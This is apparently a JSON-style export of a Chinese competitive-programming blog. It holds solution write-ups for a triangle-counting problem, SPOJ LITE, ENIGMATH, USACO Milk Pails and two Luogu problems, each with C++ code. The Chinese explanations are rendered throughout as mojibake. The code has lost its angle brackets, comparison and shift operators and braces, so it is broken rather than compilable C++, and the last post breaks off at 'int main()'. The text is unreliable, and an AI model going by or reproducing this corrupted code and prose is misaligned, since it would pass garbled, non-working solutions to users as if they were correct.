$80pts$é¢˜ç›®å¼ºè°ƒéœ€è¦æ„æˆç­‰è…°ä¸‰è§’å½¢ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰èƒ½ç»„æˆä¸‰è§’å½¢çš„åˆ†æˆä¸¤ç±»ï¼šç­‰è¾¹ä¸ç­‰è…°ã€‚ å…ˆç»™è¾“å…¥çš„æœ¨æ£çš„é•¿åº¦å»ä¸€ä¸‹é‡ï¼Œå¹¶è®°å½•æ¯ä¸€è¾¹é•¿çš„æœ¨æ£æ•°é‡ã€‚ç„¶åå°†ä¸é‡å¤çš„é•¿åº¦æ’ä¸€ä¸ªåºã€‚å¯¹äºç­‰è¾¹ä¸‰è§’å½¢ï¼Œç›´æ¥æŒ‰ä¸Šè¿°æ–¹æ³•æ±‚è§£ï¼›å¯¹äºæ™®é€šçš„ç­‰è…°ä¸‰è§’å½¢ï¼Œä¸¤å±‚å¾ªç¯è¿›è¡Œæšä¸¾ï¼Œè®¾ä¸¤æ¡è¾¹é•¿ä¸º $b[i],b[j]$ ä»¥åŠè¯¥é•¿åº¦çš„æœ¨æ£æ•°é‡ä¸º $num[i],num[j]$ã€‚å¦‚æœä»¥ $b[i]$ ä¸ºè…°ï¼Œåˆ™éœ€è¦æ»¡è¶³ $b[i] \\times 2 b[j]$ ä¸” $num[j] \\ge 2$ï¼›è‹¥ä»¥ $b[i]$ ä¸ºåº•ï¼Œåˆ™éœ€è¦æ»¡è¶³ $num[j] \\ge 2$ å³å¯ã€‚ åˆ™ç­”æ¡ˆæœ‰ $\\sum^k_{i = 1} \\dbinom{num[i]}{3} + \\sum^k_{i = 1} \\sum^k_{j = i + 1} \\dbinom{num[i]}{2} \\times num[j] + \\dbinom{num[j]}{2} \\times num[i]$ã€‚($num[i],num[j],b[i],b[j]$ è¦ç¡®ä¿æ»¡è¶³ä¸Šè¿°æ¡ä»¶) æ—¶é—´å¤æ‚åº¦ä¸º $Î˜(n^2)$ï¼Œè¿˜æœ‰æœ€åä¸€ä¸ªéƒ¨åˆ†æ— æ³•é€šè¿‡ã€‚ for (int i = 1;i = k;++i) if(vis[b[i]] = 3) ans += c[vis[b[i]]][3],ans %= mod;//ç­‰è¾¹ for (int i = 1;i = k;++i) for (int j = i + 1;j = k;++j) if(2 * b[i] = b[j]) break; if(2 * b[i] b[j] vis[b[i]] = 2) ans += c[vis[b[i]]][2] * vis[b[j]],ans %= mod;//a,a,b aå¤šæ¬¡å‡ºç° for (int j = i + 1;j = k;++j) if(vis[b[j]] = 2) ans += c[vis[b[j]]][2] * vis[b[i]],ans %= mod;//a,a,b bå¤šæ¬¡å‡ºç° $100pts$è€ƒè™‘å°†ç¨‹åºè¿›è¡Œä¼˜åŒ–ï¼Œç”¨å‰ç¼€å’Œæ¥ç»´æŠ¤æœ¨æ£é•¿åº¦ä¸º $i$ æ—¶ï¼Œå°äºç­‰äºç¬¬ $i$ æ ¹æœ¨æ£çš„é•¿åº¦çš„æ•°é‡ã€‚è¿™æ ·é¢„å¤„ç†åï¼Œæ—¶é—´å¤æ‚åº¦å°±å˜ä¸º $Î˜(n)$ã€‚ä¼˜åŒ–åçš„ä»£ç å¦‚ä¸‹ï¼š#include iostream#include cstdio#include algorithm#define mod 998244353#define ll long longusing namespace std;const int MAX = 200005;ll vis[MAX 1],a[MAX],b[MAX],c[MAX][5],s[MAX 1],ans,n,k;//æ•°ç»„è®°å¾—å¼€åˆ°æœ€å¤§å€¼çš„ 2 å€ï¼Œå¦åˆ™åœ¨è®¡ç®—ä¸¤è¾¹ä¹‹å’Œæ˜¯å¦å¤§äºç¬¬ä¸‰è¾¹æ—¶ä¼š REint main () //ç”¨æ¨è¾‰ä¸‰è§’è®¡ç®—ç»„åˆæ•° c[0][0] = c[1][0] = c[1][1] = 1; for (int i = 2;i = 200000;++i) c[i][0] = 1;//åˆå§‹åŒ– for (int j = 1;j = min (i,3);++j) c[i][j] = (c[i - 1][j - 1] + c[i - 1][j]) % mod; scanf (%lld,n); for (int i = 1;i = n;++i) scanf (%lld,a[i]); if (!vis[a[i]]) b[++k] = a[i];//å»é‡ vis[a[i]]++;//è®°å½•æ•°é‡ sort (b + 1,b + 1 + k);//æ’åº for (int i = 1;i MAX 1;++i) s[i] = s[i - 1] + vis[i];//å‰ç¼€å’Œè¿›è¡Œé¢„å¤„ç† for (int i = 1;i = k;++i) if(vis[b[i]] = 3) ans += c[vis[b[i]]][3],ans %= mod;//ç­‰è¾¹ ans += c[vis[b[i]]][2] * (s[b[i] * 2 - 1] - vis[b[i]]),ans %= mod; printf (%lld ,ans); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šSP7259 LITE - Light Switching","path":"/2020/07/19/SPOJ7259/","content":"è¯»å®Œé¢˜ç›®åº”è¯¥å°±èƒ½å‘ç°æ˜¯ä¸€é“çº¿æ®µæ ‘çš„æ¿å­é¢˜ç›®ã€‚ è¿™é“é¢˜ç›®å…±æœ‰ä¸¤ä¸ªæ“ä½œï¼š åœ¨ä¸€æ®µåŒºé—´å†…ï¼ŒæŠŠæ‰€æœ‰å¼€çš„ç¯å…³äº†ï¼Œå†æŠŠå…³çš„ç¯æ‰“å¼€ã€‚ åœ¨ä¸€æ®µåŒºé—´å†…ï¼Œæ±‚å¼€çš„ç¯çš„ä¸ªæ•° å¯¹äºç¬¬ä¸€ä¸ªæ“ä½œï¼Œä¹Ÿå°±æ˜¯ $0 \\to 1,1 \\to0$ï¼Œæ˜¯ä¸æ˜¯å¾ˆå®¹æ˜“æƒ³åˆ° ^ã€‚æˆ‘ä»¬å¯ä»¥å¼€ä¸¤ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªç”¨äºç»´æŠ¤å¼€çš„ç¯ï¼Œå¦ä¸€ä¸ªç»´æŠ¤å…³çš„ç¯ï¼Œåˆ†åˆ«è®°ä¸º tree1 å’Œ tree2ã€‚è‹¥æœ‰ $a$ ä¸ªç¯æ˜¯å¼€çš„ï¼Œ$b$ ä¸ªç¯æ˜¯å…³çš„ï¼Œåˆ™å½“è¿›è¡Œæ“ä½œä¸€åï¼Œä¼šæœ‰ $b$ ä¸ªç¯æ˜¯å¼€çš„ï¼Œ$a$ ä¸ªç¯æ˜¯å…³çš„ã€‚ä¹Ÿå°±æ˜¯æŠŠ è¿™ä¸¤ä¸ªæ•°äº¤æ¢äº†ä¸€ä¸‹ã€‚å› ä¸ºæ˜¯åŒºé—´æ›´æ–°ï¼Œæ‰€ä»¥è¿˜è¦é…åˆç€æ ‡è®°ä¸‹ä¼ çš„ä½¿ç”¨ã€‚æ ‡è®°å¾ˆç®€å•ï¼Œæ¯æ¬¡å¼‚æˆ–ä¸€ä¸‹å°±è¡Œï¼Œä½†éœ€è¦è®°å¾—æœ€åçš„æ ‡è®°æ¸…ç©ºæ“ä½œã€‚ å¯¹äºç¬¬äºŒä¸ªæ“ä½œï¼Œä¹Ÿå°±æ˜¯æŸ¥è¯¢æ“ä½œã€‚æˆ‘ä»¬åªéœ€è¦æŸ¥è¯¢è¯¥åŒºé—´å†…æœ‰å…³ tree2 çš„å€¼å³å¯ã€‚æŠŠåŒºé—´å†…ç¬¦åˆæ¡ä»¶çš„æ•°ç»„è¿›è¡Œç´¯åŠ ï¼Œæœ€åè¾“å‡ºå°±å®Œäº‹äº†ã€‚ å®Œæ•´ä»£ç ï¼š #include iostream#include cstdiousing namespace std;const int MAX = 100005;int temp[MAX 2],n,m,tree1[MAX 2],tree2[MAX 2];//tree1 ç»´æŠ¤å…³ç¯çš„æ•°é‡ï¼Œtree2 ç»´æŠ¤å¼€ç¯çš„æ•°é‡ void build (int cur,int l,int r);void ch (int cur,int l,int r,int x,int y);void pushdown (int cur);int query (int cur,int l,int r,int x,int y);int main () scanf (%d%d,n,m); build (1,1,n); for (int i = 1;i = m;++i) int type; scanf (%d,type); if (type == 0) int x,y; scanf (%d%d,x,y); ch (1,1,n,x,y); else int x,y; scanf (%d%d,x,y); printf (%d ,query (1,1,n,x,y)); return 0;void build (int cur,int l,int r) if (l == r) tree1[cur]++;//åŒç† tree[cur] = 1 return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r); tree1[cur] = tree1[cur 1] + tree1[cur 1 | 1];void ch (int cur,int l,int r,int x,int y) if (l = x r = y) temp[cur] ^= 1;//å¼‚æˆ– swap (tree1[cur],tree2[cur]);//äº¤æ¢ return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) ch (cur 1,l,mid,x,y); if (y mid) ch (cur 1 | 1,mid + 1,r,x,y); tree1[cur] = tree1[cur 1] + tree1[cur 1 | 1]; tree2[cur] = tree2[cur 1] + tree2[cur 1 | 1];//åŒæ—¶æ›´æ–° void pushdown (int cur)//æ ‡è®°ä¸‹ä¼  if (temp[cur] == 0) return ; swap (tree1[cur 1],tree2[cur 1]); swap (tree1[cur 1 | 1],tree2[cur 1 | 1]);//äº¤æ¢ temp[cur 1] ^= 1,temp[cur 1 | 1] ^= 1;//å¼‚æˆ–ä¸€ä¸‹ temp[cur] = 0;//æ¸…ç©ºï¼ï¼ï¼ int query (int cur,int l,int r,int x,int y) if (l = x r = y) return tree2[cur];//æ³¨æ„è¿”å› tree2 çš„å€¼ int mid = (l + r) 1; pushdown (cur); int ans = 0; if (x = mid) ans += query (cur 1,l,mid,x,y); if (y mid) ans += query (cur 1 | 1,mid + 1,r,x,y); return ans;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šSP15965 ENIGMATH - PLAY WITH MATH","path":"/2020/07/11/SP15965/","content":"ç®€å•æ¨ä¸€ä¸‹è¿™ä¸ªå¼å­ï¼ $A \\times x - B \\times y = 0$ï¼›ç§»é¡¹å¾— $A \\times x = B \\times y$ï¼›å·²çŸ¥é¡¹ä¸º $A,B$ï¼Œæˆ‘ä»¬æŠŠæœªçŸ¥é¡¹ç§»åŠ¨åˆ°ä¸€è¾¹ï¼Œåˆ™æœ‰ï¼š$\\frac{x}{y} = \\frac{B}{A}$ã€‚ æ¬²æ±‚ $x,y$ çš„æœ€å°æ­£æ•´æ•°è§£ï¼Œä¹Ÿå°±éœ€è¦ $A,B$ äº’è´¨çš„æ—¶å€™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹ $A,B$ è¿›è¡Œçº¦åˆ†ï¼Œçº¦çš„æ•°å­—å³ä¸¤è€…èƒ½åŒæ—¶é™¤å°½çš„æ•°â€”æœ€å¤§å…¬çº¦æ•°ã€‚äºæ˜¯å°±æœ‰äº†ï¼š $\\frac{x}{y} = \\frac{B \\div \\gcd{(A,B)}}{A \\div \\gcd{(A,B)}}$ å¯¹äºæ±‚æœ€å¤§å…¬çº¦æ•°ï¼Œç”¨è¾—è½¬ç›¸é™¤æ³•å°±å¯ä»¥äº†ï¼Œåœ¨æ­¤ä¸èµ˜è¿°ã€‚ æ‰€ä»¥æœ€åï¼Œå¯¹äºä¸€ç»„ $A,B$ï¼Œå°±æœ‰æœ€ä¼˜è§£ $x = B \\div \\gcd{(A,B)},y = A \\div \\gcd{(A,B)}$ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdiousing namespace std;int gcd (int x,int y) if (y == 0) return x; return gcd (y,x % y);int main () int t,a,b; cint; while (t--) cinab; coutb / gcd (a,b) a / gcd (a,b)endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP3139 [USACO16FEB]Milk Pails S","path":"/2020/06/27/P3139/","content":"é¢˜å¤–è¯ï¼šä»–æœ‰ä¸‰ä¸ªæ¡¶ æ˜¯ä¸æ˜¯åº”è¯¥æ”¹æˆ ä¸¤ä¸ªæ¡¶ å•Š emmmã€‚ æ–¹æ³•ï¼š ç”¨ $\\texttt{BFS}$ è¿›è¡Œæœç´¢æšä¸¾ã€‚æŠŠä¸‰ä¸ªæ“ä½œåˆ†åˆ«è½¬æˆæ•°å­¦è¯­è¨€å³å¯ã€‚ æ¥ä¸‹æ¥ä¸ºäº†è¡¨ç¤ºç»Ÿä¸€ï¼ŒæŠŠå½“å‰çš„ä¸¤ä¸ªæ¡¶ä¸­çš„ç‰›å¥¶è®¾ä¸º $(m,n)$ï¼Œåˆ™åº”æœ‰ $0 \\le m \\le X,0 \\le n \\le Y$ã€‚ æ“ä½œâ‘ ï¼šè£…æ»¡ç‰›å¥¶ã€‚å¾ˆç®€å•ï¼Œåªè¦æŠŠ $m = X$ æˆ– $n = Y$ å³å¯ã€‚ä¸¤ç§æƒ…å†µåˆ†åˆ«å˜ä¸º $(X,n)$ ä¸ $(m,Y)$ã€‚ æ“ä½œâ‘¡ï¼šå€’ç©ºç‰›å¥¶ã€‚ä¹Ÿååˆ†å®¹æ˜“ï¼ŒæŠŠ $m = 0$ æˆ– $n = 0$ï¼Œå¯¹åº”çš„ä¸¤ç§æƒ…å†µåˆ†åˆ«å˜ä¸º $(0,n)$ ä¸ $(m,0)$ã€‚ æ“ä½œâ‘¢ï¼šç›¸äº’å€’ç‰›å¥¶ã€‚è¿™é‡Œæ¶‰åŠåˆ°å¤šç§çš„åˆ†ç±»è®¨è®ºã€‚é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªæ¡¶ä¸­çš„ç‰›å¥¶åˆ°ç»™ç¬¬äºŒä¸ªæ¡¶ä¸­ï¼Œåˆ™ä¼šå‡ºç°ä¸¤ç§æƒ…å†µï¼šç¬¬ä¸€ä¸ªæ¡¶å€’å®Œä¸æœªå€’å®Œ(æœªåˆ°å®Œå³å¯¹åº”ç¬¬äºŒä¸ªæ¡¶å·²å€’æ»¡)ï¼Œå°†ä¸¤ç§æƒ…å†µæ•´ç†å¯åˆå¹¶æˆä¸€ä¸ªå¼å­ï¼š$(m - \\min (m,Y - n),\\min (Y,n + m))$ã€‚ç¬¬äºŒå¤§ç±»ä¸ç¬¬ä¸€ç±»ç›¸åï¼Œæ‰€ä»¥å¼å­æ”¹å˜ä¸€ä¸‹å˜æˆï¼š$(\\min (X,n + m),n - \\min (n,X - m))$ã€‚ é‚£ä¹ˆæ˜¯å¦éœ€è¦æ¯ä¸€æ¬¡æ“ä½œåéƒ½å°†è¿™ $8$ å¤§ç±»åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å»å‘¢ï¼Ÿè‚¯å®šä¸éœ€è¦ï¼Œå¦åˆ™å†—ä½™çš„æ“ä½œä¼šä½¿ç¨‹åº $\\texttt{TLE}$ã€‚çœ‹ä¸‹ $X,Y$ çš„æ•°æ®èŒƒå›´ï¼Œ$1 \\le X,Y \\le 100$ï¼Œå¼€ä¸ªäºŒç»´æ•°ç»„ vis[105][105]ï¼Œvis[i][j] è¡¨ç¤ºä¸¤ä¸ªæ¡¶åˆ†åˆ«è£… $i$ ä¸ $j$ çš„å•ä½çš„ç‰›å¥¶çš„æƒ…å†µæ˜¯å¦å·²ç»å‡ºç°è¿‡ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦å°†æœªå‡ºç°è¿‡çš„æƒ…å†µåŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å»å°±è¡Œäº†ã€‚ æœ€åå°±æ˜¯ç­”æ¡ˆçš„æ›´æ–°äº†ï¼Œä¸ç”¨è¯´ï¼Œæ¯æ¬¡åœ¨å–å‡ºå½“å‰é˜Ÿåˆ—çš„é˜Ÿé¦–å…ƒç´ åè¿›è¡Œåˆ¤æ–­æ›´æ–° $ans = \\min(ans,M - |m + n|)$ å°±å®Œäº‹äº†å•Šï¼ å…·ä½“å®ç°çš„ä»£ç ï¼š #include iostream#include queue#include cmath #define INF 0x3f3f3f3fusing namespace std; const int MAX = 105;struct _pair int dx,dy;;bool vis[MAX][MAX];int x,y,k,m,ans = INF;queue _pair q; void search (int num);int main () cinxykm; q.push (0,0);vis[0][0] = 1;//ä¸€å¼€å§‹çš„æƒ…å†µ search (0); coutansendl; return 0;void search (int num) queue _pair milk;//å°†æœ€æ–°çš„æƒ…å†µå‹å…¥é˜Ÿåˆ— if (num == k + 1) return ;//æ¬¡æ•°å·²åˆ°,æ³¨æ„æ˜¯k + 1 æ¬¡ while (!q.empty ())//æ›´æ–°æ‰€æœ‰å¯èƒ½çš„æƒ…å†µ _pair now = q.front ();q.pop (); ans = min (ans,abs (m - now.dx - now.dy));//æ›´æ–°æœ€ä¼˜ç­”æ¡ˆ |m - m| //è‹¥æ­¤æƒ…å†µæ²¡æœ‰å‡ºç°è¿‡ï¼Œåˆ™åŠ å…¥é˜Ÿåˆ—ä¸­ //è£…æ»¡ if (!vis[x][now.dy]) milk.push (x,now.dy),vis[x][now.dy] = 1; if (!vis[now.dx][y]) milk.push (now.dx,y),vis[now.dx][y] = 1; //å€’ç©º if (!vis[now.dx][0]) milk.push (now.dx,0),vis[now.dx][0] = 1; if (!vis[0][now.dy]) milk.push (0,now.dy),vis[0][now.dy] = 1; //äº’ç›¸å€’ if (!vis[now.dx - min (now.dx,y - now.dy)][min (y,now.dy + now.dx)]) milk.push (now.dx - min (now.dx,y - now.dy),min (y,now.dy + now.dx)),vis[now.dx - min (now.dx,y - now.dy)][min (y,now.dy + now.dx)] = 1; if (!vis[min (x,now.dx + now.dy)][now.dy - min (now.dy,x - now.dx)]) milk.push (min (x,now.dx + now.dy),now.dy - min (now.dy,x - now.dx)),vis[min (x,now.dx + now.dy)][now.dy - min (now.dy,x - now.dx)] = 1; while (!milk.empty ()) q.push (milk.front ()),milk.pop ();//å°†æ‰€æœ‰å¯èƒ½æ”¾å…¥ q ä¸­ search (num + 1); $\\texttt{end:}$ æ³¨æ„ä¸€ä¸‹é€’å½’çš„è¾¹ç•Œï¼ï¼ï¼if (num == k + 1) return ; å†™æˆ if (num == k) return ; è°ƒäº†æˆ‘å¥½ä¹…å•Š $\\texttt{qwq}$ï¼","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6606 [Code+#7]æœ€å°è·¯å¾„ä¸²","path":"/2020/06/12/P6606/","content":"è¿™é“é¢˜ç›®å…¶å®æ˜¯ä¸€é“æœç´¢é¢˜ç›®ï¼Œä½†éœ€è¦æ³¨æ„ï¼Œæ‰€è¦æŸ¥æ‰¾çš„ç­”æ¡ˆå¹¶ä¸æ˜¯è¦æœ€å°è€Œæ˜¯æ»¡è¶³è·¯å¾„ä¸Šæ‰€æœ‰ç‚¹çš„æ•°å­—ä¸²é¡ºæ¬¡è¿æ¥å½¢æˆçš„ä¸²çš„å­—å…¸åºæœ€å°ã€‚ å› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥ä»ä¸€ä¸ªç‚¹å¼€å§‹ï¼Œæ‰¾åˆ°è¿æ¥è¯¥ç‚¹çš„æœ€å°æ•°å­—ä¸²ã€‚ä¸¾ä¸ªä¾‹å­ï¼š $000001\\begin{cases}000002\\begin{cases}000008\\\\000007\\end{cases}\\\\000003\\\\000006\\begin{cases}000004\\\\000005\\end{cases}\\end{cases}$ æˆ‘ä»¬æ‰€å¾—çš„æœ€ä½³è·¯å¾„ä¸º 000001-000002-000007ã€‚ç”¨ vector æ¥å‚¨å­˜è¾¹çš„å€¼ï¼Œå­˜å‚¨å®Œåå°†å®ƒè¿›è¡Œä»å°åˆ°å¤§æ’åºï¼Œç„¶åå†è¿›è¡Œæœç´¢ï¼Œæ¯æ¬¡æ‰¾åˆ°ç›¸é‚»è¾¹çš„ç¬¬ä¸€ä¸ªæœªæ›´æ–°è¿‡çš„ç‚¹ï¼Œç„¶åå°†å…¶è®°å½•åœ¨ç­”æ¡ˆä¹‹ä¸­ã€‚(ä¸ºä»€ä¹ˆæ˜¯ç¬¬ä¸€ä¸ªå‘¢ï¼Ÿå› ä¸ºåœ¨ä¹‹å‰å·²æ’è¿‡åºï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæœªæ›´æ–°çš„ç‚¹ä¸€å®šæ˜¯å½“å‰ç­”æ¡ˆçš„æœ€ä¼˜è§£ï¼) æœ€åå°±æ˜¯å¦‚ä½•è®°å½•ç­”æ¡ˆï¼Œæˆ‘ä»¬ç”¨ ans[i] å‚¨å­˜ $0$ è‡³ $i$ çš„æœ€ä¼˜è§£ï¼Œç„¶åæœç´¢å¾—åˆ°çš„æ–°ç‚¹å¯ä»¥ç”¨ (nowans * 1000000 + next) % mod è®°å½•ï¼Œå†ä¸¾ä¸€ä¸ªä¾‹å­ï¼š$000002 -000005$ å°±æ˜¯ $ 2 \\times 10^6 + 5$ã€‚ æ³¨æ„ï¼šè¿™ç›¸å½“äºä¸€å¼ æ— å‘å›¾ï¼Œä¸”åŒ…å«äº†é‡è¾¹ä¸è‡ªç¯ã€‚å› æ­¤åœ¨å¤„ç†çš„æ—¶å€™è¦æ³¨æ„è¿™ç±»ç‰¹æ®Šçš„æƒ…å†µã€‚ æœ€åæ˜¯ä»£ç ï¼š #include iostream#include vector#include algorithm#include cstring#define INF 0x3f3f3f3f#define MOD 998244353#define ll long long#define MAX 2000005using namespace std;vector ll e[MAX];ll ans[MAX]; bool cmp(int x,int y) return x y;void dfs(int st,ll s);int main() int n,m; cinnm; memset(ans,-1,sizeof(ans));//åˆå§‹åŒ– for(int i = 1;i = m;++i) int a = 0,b = 0;char x; for(int j = 1;j = 6;++j) cinx,a = a * 10 + x - 0; for(int j = 1;j = 6;++j) cinx,b = b * 10 + x - 0; if(a != b)//ä¸ä¸ºé‡è¾¹ e[a].push_back(b),e[b].push_back(a);//æ— å‘è¾¹ for(int i = 0;i n;++i) sort(e[i].begin(),e[i].end(),cmp);//æ’åº dfs(0,0); for(int i = 1;i n;++i) coutans[i]endl; return 0;void dfs(int st,ll s) ans[st] = s;//æ›´æ–°ç­”æ¡ˆ for(int i = 0;i e[st].size();++i) if(ans[e[st][i]] == -1)//æœªæ›´æ–°è¿‡--æœªåˆ°è¿‡ dfs(e[st][i],(s * 1000000 + e[st][i]) % MOD);//å–æ¨¡","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6682 åº§ä½è°ƒæŸ¥","path":"/2020/05/31/P6682/","content":"æ¡å½¢åº§ä½çš„å®šä¹‰ï¼šåœ¨ $n$ ä¸ªåº§ä½ä¸­æœ‰ $2$ ä¸ªåº§ä½åªæœ‰ä¸€ä¸ªç›¸é‚»çš„åº§ä½(ä¸ºç«¯ç‚¹) å…¶ä½™ $n - 2$ ä¸ªåº§ä½å‡æœ‰ä¸¤ä¸ªç›¸é‚»çš„åº§ä½ã€‚($n = 1$ æ—¶ä¹Ÿç®—) $\\texttt{subtask 1-3}$å³ä¸º$n = 1$ çš„æƒ…å†µï¼Œè¯´æ˜åªæœ‰ä¸€è¡Œï¼Œå› æ­¤ä¸€å®šæ˜¯æ¡å½¢åº§ä½ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ ¹æ®ä¹˜æ³•åŸç†å°†æ¯ç»„æ¡å½¢åº§ä½çš„æ–¹æ¡ˆç›¸ä¹˜å³å¯ã€‚ é‚£ä¹ˆæ¯ç»„æ¡å½¢åº§ä½çš„æ–¹æ¡ˆå¦‚ä½•è®¡ç®—å‘¢ï¼Ÿè¿˜æ˜¯ä¹˜æ³•åŸç†ï¼æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹é€‰åº§ä½çš„è¦æ±‚ï¼šä»»æ„è€ƒç”Ÿä¸å¯èƒ½å’Œæ¥è‡ªåŒå­¦æ ¡çš„è€ƒç”Ÿåº§ä½ç›¸é‚»ã€‚é‚£ä¹ˆå¯¹äº $k$ ä¸ªå­¦æ ¡çš„å­¦ç”Ÿä¸ä¸€ä¸ªé•¿åº¦ä¸º $m$ çš„æ¡å½¢åº§ä½ã€‚[$k \\ge 2$] ç¬¬ä¸€ä¸ªä½ç½®è‚¯å®šæœ‰ $k$ ç§æƒ…å†µï¼›ç¬¬äºŒä¸ªåº§ä½çš„å­¦ç”Ÿä¸ç¬¬ä¸€ä¸ªçš„æ¥è‡ªä¸åŒçš„å­¦æ ¡ï¼Œæ‰€ä»¥åªæœ‰ $k - 1$ ç§æƒ…å†µï¼›ç¬¬ä¸‰ä¸ªåº§ä½çš„å­¦ç”Ÿä¸ç¬¬äºŒä¸ªçš„æ¥è‡ªä¸åŒçš„å­¦æ ¡ï¼Œä½†å¯ä»¥ä¸ç¬¬ä¸€ä¸ªçš„æ¥è‡ªç›¸åŒçš„å­¦æ ¡ï¼Œæ‰€ä»¥ä»ç„¶æœ‰ $k - 1$ ç§æƒ…å†µã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œä¸Šé¢çš„ä¸€ç»„æ¡å½¢åº§ä½çš„æ–¹æ¡ˆæ•°ä¸º $k \\times (k - 1) ^ {n - 1}$ $[k \\ge2]$ã€‚æ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ° $40pts$ çš„ä»£ç ï¼š #include iostream#define MOD 998244353 using namespace std;char a[1005][1005];int an[1005];int main() int n,m,k,w = 0;long long ans = 1;//long longï¼ï¼ï¼ cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = m;i++) if(a[1][i] == O a[1][i - 1] != O) an[++w]++;//æ–°çš„æ¡å½¢åº§ä½ else if(a[1][i] == O) an[w]++;//åº§ä½çš„é•¿åº¦å¢åŠ  for(int i = 1;i = w;i++) long long num = k; for(int j = 2;j = an[i];j++) num *= k - 1,num %= MOD;//è®¡ç®—ä¸å–æ¨¡ ans *= num;ans %= MOD;//ç­”æ¡ˆç´¯è®¡å–æ¨¡ coutansendl; return 0; $\\texttt{subtask 4ï¼Œ5}$æˆ‘ä»¬å°†ä¸Šé¢çš„æ€è·¯ç”±ä¸€ç»´æ‰©å±•åˆ°äºŒç»´ï¼Œå‘ç°æˆ‘ä»¬åªè¦è¿›è¡Œä¸€æ¬¡æœç´¢è¿›è¡Œè¿é€šå—æ•°é‡çš„ç»Ÿè®¡å°±è¡Œäº†ã€‚ éœ€è¦å¤šå¼€ä¸€ä¸ª vis[1005][1005] çš„æ•°ç»„ï¼Œç”¨äºè®°å½•è¯¥ç‚¹æ˜¯å¦åˆ°è¾¾è¿‡ã€‚æ¯ä¸€ä¸ªè¿é€šå—çš„å¤§å°éƒ½è¦å•ç‹¬è®¡ç®—ï¼Œå› æ­¤åœ¨æœç´¢å®Œæ¯•åä¼šå¾—åˆ°è‹¥å¹²ä¸ªå¤§å°ä¸åŒçš„æ¡å½¢åº§ä½ï¼Œåˆ†åˆ«ç»è¿‡ä¸Šè¿°å…¬å¼è®¡ç®—åç›¸ä¹˜å³å¯å¾—å‡ºç­”æ¡ˆã€‚$80pts$ çš„ä»£ç å¦‚ä¸‹ï¼š #include iostream#define MOD 998244353 #define MAX 1005#define ll long longusing namespace std;char a[MAX][MAX];ll an[MAX],ans = 1;bool vis[MAX][MAX];int dx[4] = 1,-1,0,0,dy[4] = 0,0,1,-1,n,m,k,w;void search(int x,int y);int main() cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) if(!vis[i][j] a[i][j] == O) w++,search(i,j); for(int i = 1;i = w;++i)//è®¡ç®— ll sum = k; for(int j = 2;j = an[i];++j) sum *= k - 1,sum %= MOD; ans *= sum,ans %= MOD; coutansendl; return 0;void search(int x,int y) vis[x][y] = 1;an[w]++;//æ ‡è®°å·²ç»åˆ°è¿‡ï¼Œç­”æ¡ˆåŠ 1 for(int i = 0;i 4;++i) int xx = x + dx[i],yy = y + dy[i]; if(1 = xx 1 = yy xx = n y = m !vis[xx][yy] a[xx][yy] == O) search(xx,yy);//æœç´¢ $\\texttt{subtask 6}$å¯èƒ½å‡ºç°ä¸æ˜¯æ¡å½¢åº§ä½çš„æƒ…å†µï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ¤æ–­æ¯ä¸ªè¿é€šå—æ˜¯å¦åˆæ³•ã€‚è‹¥ä¸åˆæ³•ï¼Œå°±è¦ç‰¹åˆ¤è¾“å‡º $0$ ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å»æ£€æŸ¥å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥å¼€ä¸€ä¸ªé˜Ÿåˆ—ï¼šæ¯æ¬¡æœç´¢è®¡æ•°ä¸€ä¸ªè¿é€šå—æ—¶ï¼Œæœç´¢åˆ°ä¸€ä¸ªæ–°çš„ç‚¹æ—¶ï¼ŒæŠŠè¯¥ç‚¹çš„åæ ‡è®°å½•åˆ°é˜Ÿåˆ—ä¸­å»ã€‚åœ¨æœç´¢å®Œæ¯•åï¼Œè¿›è¡Œç»Ÿä¸€çš„æ£€æŸ¥ã€‚ä¸æ–­å–å‡ºé˜Ÿåˆ—ä¸­çš„å…ƒç´ ï¼Œè‹¥ä¸æ»¡è¶³åªæœ‰ $2$ ä¸ªç›¸é‚»åº§ä½æ•°ä¸º $1$ çš„ç‚¹ä¸”å…¶ä½™åº§ä½çš„ç›¸é‚»åº§ä½æ•°å‡ä¸º $2$ï¼Œå°±è¯´æ˜ä¸æ»¡è¶³æ¡ä»¶ï¼Œè¾“å‡º $0$ å¹¶åœæ­¢ç¨‹åºã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰ä¸€ä¸ªåº§ä½çš„æƒ…å†µéœ€è¦é¢å¤–çš„ç‰¹åˆ¤ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº† $100pts$ çš„ä»£ç ï¼š #include iostream#include queue#define MOD 998244353 #define MAX 1005#define ll long longusing namespace std;struct node int x,y;;queue node q;char a[MAX][MAX];ll an[MAX],ans = 1;bool vis[MAX][MAX];int dx[4] = 1,-1,0,0,dy[4] = 0,0,1,-1,num[MAX][MAX],n,m,k,w;void search(int x,int y);bool check();int main() 